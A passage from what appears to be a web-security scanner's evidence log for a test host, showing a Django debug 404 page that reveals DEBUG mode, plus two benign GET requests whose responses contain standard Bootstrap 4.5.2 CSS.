    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    <pre class="exception_value">&#x27;css/bootstrap-9.9.9-nonexistent.min.css&#x27; could not be found</pre>
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
        <td>http://target.local:32840/static/css/bootstrap-9.9.9-nonexistent.min.css</td>
      </tr>
      
      <tr>
        <th>Raised by:</th>
        <td>django.views.static.serve</td>
      </tr>
      
    </table>
  </div>
  <div id="info">
    
  </div>

  <div id="explanation">
    <p>
      You’re seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```

- Evidence `ev-mqysrnlv-47` — `artifacts/_/ev-mqysrnlv-47/`

Request:

```http
GET /static/css/bootstrap.min.css HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response (truncated):

```http
HTTP/1.1 200
content-disposition: inline; filename="bootstrap.min.css"
content-length: 160302
content-type: text/css
date: Mon, 29 Jun 2026 05:48:40 GMT
last-modified: Sat, 27 Jun 2026 15:38:26 GMT
server: WSGIServer/0.2 CPython/3.9.2

/*!
 * Bootstrap v4.5.2 (https://getbootstrap.com/)
 * Copyright 2011-2020 The Bootstrap Authors
 * Copyright 2011-2020 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
 */:root{--blue:#007bff;--indigo:#6610f2;--purple:#6f42c1;--pink:#e83e8c;--red:#dc3545;--orange:#fd7e14;--yellow:#ffc107;--green:#28a745;--teal:#20c997;--cyan:#17a2b8;--white:#fff;--gray:#6c757d;--gray-dark:#343a40;--primary:#007bff;--secondary:#6c757d;--success:#28a745;--info:#17a2b8;--warning:#ffc107;--danger:#dc3545;--light:#f8f9fa;--dark:#343a40;--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;--font-family-sans-serif:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--font-family-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}*,::after,::before{box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent}article,aside,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff}[tabindex="-1"]:focus:not(:focus-visible){outline:0!important}hr{box-sizing:content-box;height:0;overflow:visible}h1,h2,h3,h4,h5,h6{margin-top:0;margin-bottom:.5rem}p{margin-top:0;margin-bottom:1rem}abbr[data-original-title],abbr[title]{text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;cursor:help;border-bottom:0;-webkit-text-decoration-skip-ink:none;text-decoration-skip-ink:none}address{margin-bottom:1rem;font-style:normal;line-height:inherit}dl,ol,ul{margin-top:0;margin-bottom:1rem}ol ol,ol ul,ul ol,ul ul{margin-bottom:0}dt{font-weight:700}dd{margin-bottom:.5rem;margin-left:0}blockquote{margin:0 0 1rem}b,strong{font-weight:bolder}small{font-size:80%}sub,sup{position:relative;font-size:75%;line-height:0;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}a{color:#007bff;text-decoration:none;background-color:transparent}a:hover{color:#0056b3;text-decoration:underline}a:not([href]):not([class]){color:inherit;text-decoration:none}a:not([href]):not([class]):hover{color:inherit;text-decoration:none}code,kbd,pre,samp{font-family:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;font-size:1em}pre{margin-top:0;margin-bottom:1rem;overflow:auto;-ms-overflow-style:scrollbar}figure{margin:0 0 1rem}img{vertical-align:middle;border-style:none}svg{overflow:hidden;vertical-align:middle}table{border-collapse:collapse}caption{padding-top:.75rem;padding-bottom:.75rem;color:#6c757d;text-align:left;caption-side:bottom}th{text-align:inherit}label{display:inline-block;margin-bottom:.5rem}button{border-radius:0}button:focus{outline:1px dotted;outline:5px auto -webkit-focus-ring-color}button,input,optgroup,select,textarea{margin:0;font-family:inherit;font-size:inherit;line-height:inherit}button,input{overflow:visible}button,select{text-transform:none}[role=button]{cursor:pointer}select{word-wrap:normal}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]:not(:disabled),[type=reset]:not(:disabled),[type=submit]:not(:disabled),button:not(:disabled){cursor:pointer}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{padding:0;border-style:none}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}textarea{overflow:auto;resize:vertical}fieldset{min-width:0;padding:0;margin:0;border:0}legend{display:block;width:100%;max-width:100%;padding:0;margin-bottom:.5rem;font-size:1.5rem;line-height:inherit;color:inherit;white-space:normal}progress{vertical-align:baseline}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{outline-offset:-2px;-webkit-appearance:none}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{font:inherit;-webkit-appearance:button}output{display:inline-block}summary{display:list-item;cursor:pointer}template{display:none}[hidden]{display:none!important}.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6{margin-bottom:.5rem;font-weight:500;line-height:1.2}.h1,h1{font-size:2.5rem}.h2,h2{font-size:2rem}.h3,h3{font-size:1.75rem}.h4,h4{font-size:1.5rem}.h5,h5{font-size:1.25rem}.h6,h6{font-size:1rem}.lead{font-size:1.25rem;font-weight:300}.display-1{font-size:6rem;font-weight:300;line-height:1.2}.display-2{font-size:5.5rem;font-weight:300;line-height:1.2}.display-3{font-size:4.5rem;font-weight:300;line-height:1.2}.display-4{font-size:3.5rem;font-weight:300;line-height:1.2}hr{margin-top:1rem;margin-bottom:1rem;border:0;border-top:1px solid rgba(0,0,0,.1)}.small,small{font-size:80%;font-weight:400}.mark,mark{padding:.2em;background-color:#fcf8e3}.list-unstyled{padding-left:0;list-style:none}.list-inline{padding-left:0;list-style:none}.list-inline-item{display:inline-block}.list-inline-item:not(:last-child){margin-right:.5rem}.initialism{font-size:90%;text-transform:uppercase}.blockquote{margin-bottom:1rem;font-size:1.25rem}.blockquote-footer{display:block;font-size:80%;color:#6c757d}.blockquote-footer::before{content:"\2014\00A0"}.img-fluid{max-width:100%;height:auto}.img-thumbnail{padding:.25rem;background-color:#fff;border:1px solid #dee2e6;border-radius:.25rem;max-width:100%;height:auto}.figure{display:inline-block}.figure-img{margin-bottom:.5rem;line-height:1}.figure-caption{font-size:90%;color:#6c757d}code{font-size:87.5%;color:#e83e8c;word-wrap:break-word}a>code{color:inherit}kbd{padding:.2rem .4rem;font-size:87.5%;color:#fff;background-color:#212529;border-radius:.2rem}kbd kbd{padding:0;font-size:100%;font-weight:700}pre{display:block;font-size:87.5%;color:#212529}pre code{font-size:inherit;color:inherit;word-break:normal}.pre-scrollable{max-height:340px;overflow-y:scroll}.container,.container-fluid,.container-lg,.container-md,.container-sm,.container-xl{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}@media (min-width:576px){.container,.container-sm{max-width:540px}}@media (min-width:768px){.container,.container-md,.container-sm{max-width:720px}}@media (min-width:992px){.container,.container-lg,.container-md,.container-sm{max-width:960px}}@media (min-width:1200px){.container,.container-lg,.container-md,.container-sm,.container-xl{max-width:1140px}}.row{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-15px;margin-left:-15px}.no-gutters{margin-right:0;margin-left:0}.no-gutters>.col,.no-gutters>[class*=col-]{padding-right:0;padding-left:0}.col,.col-1,.col-10,.col-11,.col-12,.col-2,.col-3,.col-4,.col-5,.col-6,.col-7,.col-8,.col-9,.col-auto,.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-auto,.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-auto,.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-auto,.col-xl,.col-xl-1,.col-xl-10,.col-xl-11,.col-xl-12,.col-xl-2,.col-xl-3,.col-xl-4,.col-xl-5,.col-xl-6,.col-xl-7,.col-xl-8,.col-xl-9,.col-xl-auto{position:relative;width:100%;padding-right:15px;padding-left:15px}.col{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-first{-ms-flex-order:-1;order:-1}.order-last{-ms-flex-order:13;order:13}.order-0{-ms-flex-order:0;order:0}.order-1{-ms-flex-order:1;order:1}.order-2{-ms-flex-order:2;order:2}.order-3{-ms-flex-order:3;order:3}.order-4{-ms-flex-order:4;order:4}.order-5{-ms-flex-order:5;order:5}.order-6{-ms-flex-order:6;order:6}.order-7{-ms-flex-order:7;order:7}.order-8{-ms-flex-order:8;order:8}.order-9{-ms-flex-order:9;order:9}.order-10{-ms-flex-order:10;order:10}.order-11{-ms-flex-order:11;order:11}.order-12{-ms-flex-order:12;order:12}.offset-1{margin-left:8.333333%}.offset-2{margin-left:16.666667%}.offset-3{margin-left:25%}.offset-4{margin-left:33.333333%}.offset-5{margin-left:41.666667%}.offset-6{margin-left:50%}.offset-7{margin-left:58.333333%}.offset-8{margin-left:66.666667%}.offset-9{margin-left:75%}.offset-10{margin-left:83.333333%}.offset-11{margin-left:91.666667%}@media (min-width:576px){.col-sm{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-sm-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-sm-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-sm-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-sm-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-sm-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-sm-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-sm-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-sm-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-sm-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-sm-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-sm-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-sm-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-sm-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-sm-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-sm-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-sm-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-sm-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-sm-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-sm-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-sm-first{-ms-flex-order:-1;order:-1}.order-sm-last{-ms-flex-order:13;order:13}.order-sm-0{-ms-flex-order:0;order:0}.order-sm-1{-ms-flex-order:1;order:1}.order-sm-2{-ms-flex-order:2;order:2}.order-sm-3{-ms-flex-order:3;order:3}.order-sm-4{-ms-flex-order:4;order:4}.order-sm-5{-ms-flex-order:5;order:5}.order-sm-6{-ms-flex-order:6;order:6}.order-sm-7{-ms-flex-order:7;order:7}.order-sm-8{-ms-flex-order:8;order:8}.order-sm-9{-ms-flex-order:9;order:9}.order-sm-10{-ms-flex-order:10;order:10}.order-sm-11{-ms-flex-order:11;order:11}.order-sm-12{-ms-flex-order:12;order:12}.offset-sm-0{margin-left:0}.offset-sm-1{margin-left:8.333333%}.offset-sm-2{margin-left:16.666667%}.offset-sm-3{margin-left:25%}.offset-sm-4{margin-left:33.333333%}.offset-sm-5{margin-left:41.666667%}.offset-sm-6{margin-left:50%}.offset-sm-7{margin-left:58.333333%}.offset-sm-8{margin-left:66.666667%}.offset-sm-9{margin-left:75%}.offset-sm-10{margin-left:83.333333%}.offset-sm-11{margin-left:91.666667%}}@media (min-width:768px){.col-md{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-md-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-md-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-md-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-md-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-md-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-md-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-md-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-md-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-md-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-md-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-md-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-md-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-md-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-md-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-md-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-md-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-md-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-md-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-md-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-md-first{-ms-flex-order:-1;order:-1}.order-md-last{-ms-flex-order:13;order:13}.order-md-0{-ms-flex-order:0;order:0}.order-md-1{-ms-flex-order:1;order:1}.order-md-2{-ms-flex-order:2;order:2}.order-md-3{-ms-flex-order:3;order:3}.order-md-4{-ms-flex-order:4;order:4}.order-md-5{-ms-flex-order:5;order:5}.order-md-6{-ms-flex-order:6;order:6}.order-md-7{-ms-flex-order:7;order:7}.order-md-8{-ms-flex-order:8;order:8}.order-md-9{-ms-flex-order:9;order:9}.order-md-10{-ms-flex-order:10;order:10}.order-md-11{-ms-flex-order:11;order:11}.order-md-12{-ms-flex-order:12;order:12}.offset-md-0{margin-left:0}.offset-md-1{margin-left:8.333333%}.offset-md-2{margin-left:16.666667%}.offset-md-3{margin-left:25%}.offset-md-4{margin-left:33.333333%}.offset-md-5{margin-left:41.666667%}.offset-md-6{margin-left:50%}.offset-md-7{margin-left:58.333333%}.offset-md-8{margin-left:66.666667%}.offset-md-9{margin-left:75%}.offset-md-10{margin-left:83.333333%}.offset-md-11{margin-left:91.666667%}}@media (min-width:992px){.col-lg{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-lg-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-lg-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-lg-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-lg-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-lg-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-lg-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-lg-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-lg-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-lg-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-lg-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-lg-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-lg-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-lg-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-lg-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-lg-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-lg-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-lg-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.
```

- Evidence `ev-mqyst8t0-49` — `artifacts/_/ev-mqyst8t0-49/`

Request:

```http
GET /static/css/bootstrap.min.css HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response (truncated):

```http
HTTP/1.1 200
content-disposition: inline; filename="bootstrap.min.css"
content-length: 160302
content-type: text/css
date: Mon, 29 Jun 2026 05:49:54 GMT
last-modified: Sat, 27 Jun 2026 15:38:26 GMT
server: WSGIServer/0.2 CPython/3.9.2

/*!
 * Bootstrap v4.5.2 (https://getbootstrap.com/)
 * Copyright 2011-2020 The Bootstrap Authors
 * Copyright 2011-2020 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
 */:root{--blue:#007bff;--indigo:#6610f2;--purple:#6f42c1;--pink:#e83e8c;--red:#dc3545;--orange:#fd7e14;--yellow:#ffc107;--green:#28a745;--teal:#20c997;--cyan:#17a2b8;--white:#fff;--gray:#6c757d;--gray-dark:#343a40;--primary:#007bff;--secondary:#6c757d;--success:#28a745;--info:#17a2b8;--warning:#ffc107;--danger:#dc3545;--light:#f8f9fa;--dark:#343a40;--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;--font-family-sans-serif:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--font-family-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}*,::after,::before{box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent}article,aside,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff}[tabindex="-1"]:focus:not(:focus-visible){outline:0!important}hr{box-sizing:content-box;height:0;overflow:visible}h1,h2,h3,h4,h5,h6{margin-top:0;margin-bottom:.5rem}p{margin-top:0;margin-bottom:1rem}abbr[data-original-title],abbr[title]{text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;cursor:help;border-bottom:0;-webkit-text-decoration-skip-ink:none;text-decoration-skip-ink:none}address{margin-bottom:1rem;font-style:normal;line-height:inherit}dl,ol,ul{margin-top:0;margin-bottom:1rem}ol ol,ol ul,ul ol,ul ul{margin-bottom:0}dt{font-weight:700}dd{margin-bottom:.5rem;margin-left:0}blockquote{margin:0 0 1rem}b,strong{font-weight:bolder}small{font-size:80%}sub,sup{position:relative;font-size:75%;line-height:0;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}a{color:#007bff;text-decoration:none;background-color:transparent}a:hover{color:#0056b3;text-decoration:underline}a:not([href]):not([class]){color:inherit;text-decoration:none}a:not([href]):not([class]):hover{color:inherit;text-decoration:none}code,kbd,pre,samp{font-family:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;font-size:1em}pre{margin-top:0;margin-bottom:1rem;overflow:auto;-ms-overflow-style:scrollbar}figure{margin:0 0 1rem}img{vertical-align:middle;border-style:none}svg{overflow:hidden;vertical-align:middle}table{border-collapse:collapse}caption{padding-top:.75rem;padding-bottom:.75rem;color:#6c757d;text-align:left;caption-side:bottom}th{text-align:inherit}label{display:inline-block;margin-bottom:.5rem}button{border-radius:0}button:focus{outline:1px dotted;outline:5px auto -webkit-focus-ring-color}button,input,optgroup,select,textarea{margin:0;font-family:inherit;font-size:inherit;line-height:inherit}button,input{overflow:visible}button,select{text-transform:none}[role=button]{cursor:pointer}select{word-wrap:normal}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]:not(:disabled),[type=reset]:not(:disabled),[type=submit]:not(:disabled),button:not(:disabled){cursor:pointer}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{padding:0;border-style:none}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}textarea{overflow:auto;resize:vertical}fieldset{min-width:0;padding:0;margin:0;border:0}legend{display:block;width:100%;max-width:100%;padding:0;margin-bottom:.5rem;font-size:1.5rem;line-height:inherit;color:inherit;white-space:normal}progress{vertical-align:baseline}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{outline-offset:-2px;-webkit-appearance:none}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{font:inherit;-webkit-appearance:button}output{display:inline-block}summary{display:list-item;cursor:pointer}template{display:none}[hidden]{display:none!important}.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6{margin-bottom:.5rem;font-weight:500;line-height:1.2}.h1,h1{font-size:2.5rem}.h2,h2{font-size:2rem}.h3,h3{font-size:1.75rem}.h4,h4{font-size:1.5rem}.h5,h5{font-size:1.25rem}.h6,h6{font-size:1rem}.lead{font-size:1.25rem;font-weight:300}.display-1{font-size:6rem;font-weight:300;line-height:1.2}.display-2{font-size:5.5rem;font-weight:300;line-height:1.2}.display-3{font-size:4.5rem;font-weight:300;line-height:1.2}.display-4{font-size:3.5rem;font-weight:300;line-height:1.2}hr{margin-top:1rem;margin-bottom:1rem;border:0;border-top:1px solid rgba(0,0,0,.1)}.small,small{font-size:80%;font-weight:400}.mark,mark{padding:.2em;background-color:#fcf8e3}.list-unstyled{padding-left:0;list-style:none}.list-inline{padding-left:0;list-style:none}.list-inline-item{display:inline-block}.list-inline-item:not(:last-child){margin-right:.5rem}.initialism{font-size:90%;text-transform:uppercase}.blockquote{margin-bottom:1rem;font-size:1.25rem}.blockquote-footer{display:block;font-size:80%;color:#6c757d}.blockquote-footer::before{content:"\2014\00A0"}.img-fluid{max-width:100%;height:auto}.img-thumbnail{padding:.25rem;background-color:#fff;border:1px solid #dee2e6;border-radius:.25rem;max-width:100%;height:auto}.figure{display:inline-block}.figure-img{margin-bottom:.5rem;line-height:1}.figure-caption{font-size:90%;color:#6c757d}code{font-size:87.5%;color:#e83e8c;word-wrap:break-word}a>code{color:inherit}kbd{padding:.2rem .4rem;font-size:87.5%;color:#fff;background-color:#212529;border-radius:.2rem}kbd kbd{padding:0;font-size:100%;font-weight:700}pre{display:block;font-size:87.5%;color:#212529}pre code{font-size:inherit;color:inherit;word-break:normal}.pre-scrollable{max-height:340px;overflow-y:scroll}.container,.container-fluid,.container-lg,.container-md,.container-sm,.container-xl{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}@media (min-width:576px){.container,.container-sm{max-width:540px}}@media (min-width:768px){.container,.container-md,.container-sm{max-width:720px}}@media (min-width:992px){.container,.container-lg,.container-md,.container-sm{max-width:960px}}@media (min-width:1200px){.container,.container-lg,.container-md,.container-sm,.container-xl{max-width:1140px}}.row{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-15px;margin-left:-15px}.no-gutters{margin-right:0;margin-left:0}.no-gutters>.col,.no-gutters>[class*=col-]{padding-right:0;padding-left:0}.col,.col-1,.col-10,.col-11,.col-12,.col-2,.col-3,.col-4,.col-5,.col-6,.col-7,.col-8,.col-9,.col-auto,.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-auto,.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-auto,.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-auto,.col-xl,.col-xl-1,.col-xl-10,.col-xl-11,.col-xl-12,.col-xl-2,.col-xl-3,.col-xl-4,.col-xl-5,.col-xl-6,.col-xl-7,.col-xl-8,.col-xl-9,.col-xl-auto{position:relative;width:100%;padding-right:15px;padding-left:15px}.col{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-4{-ms-flex:0 0 33.333333%;flex:0 0 